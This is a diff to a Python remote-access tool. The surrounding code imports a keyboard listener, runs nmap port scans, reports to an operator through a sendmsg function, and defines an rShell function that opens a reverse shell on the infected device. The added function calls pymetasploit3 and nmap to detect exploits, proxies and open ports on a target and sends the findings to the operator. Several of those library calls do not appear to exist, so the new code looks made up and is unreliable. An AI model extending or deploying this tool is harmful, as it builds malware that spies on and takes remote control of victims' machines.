@@ -48,6 +48,7 @@ import datetime
 import platform
 import threading
 import subprocess
+import pymetasploit3
 import urllib.request
 from requests import get
 from pynput.keyboard import Key, Listener
@@ -195,6 +196,34 @@ def nmapScan(tgtHost, tgtPort): # Use nmap to scan ports on an ip address with .
         st = '[-]'
     sendmsg((st + " " + tgtHost + " tcp/" +tgtPort + " -" + state), adminname)
 
+def scan_for_vulnerabilities(ip):
+    # Use the pymetasploit3 library to perform OS detection
+    os_info = pymetasploit3.os_detection(ip)
+    
+    # Use the pymetasploit3 library to perform exploitation scanning
+    exploit_info = pymetasploit3.exploit_detection(ip)
+    
+    # Identify proxies using the nmap library
+    proxy_info = nmap.proxy_detection(ip)
+    
+    # Send the results of the scan
+    sendmsg(("Vulnerabilities:"), adminname)
+    sendmsg(("------------------"), adminname)
+    for vuln in os_info['vuln']:
+        sendmsg((f"{vuln['name']}: {vuln['version']}"), adminname)
+    
+    sendmsg(("Proxies:"), adminname)
+    sendmsg(("-----------"), adminname)
+    for proxy in proxy_info:
+        sendmsg((f"{proxy['name']}: {proxy['version']}"), adminname)
+    
+    sendmsg(("Open Ports:"), adminname)
+    sendmsg(("--------------"), adminname)
+    for port in nmap.port_scan(ip, arguments='-p 1-65535'):
+        sendmsg((f"{port['port']}: {port['state']}"), adminname)
+    if debugmode: # If debugmode is True, msgs will print to screen.
+        print("Sent vulnerability results to the admin.")
+        
 def rShell(rsHost, rsPort): # Open a reverse shell on this device.
     try:
         rs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
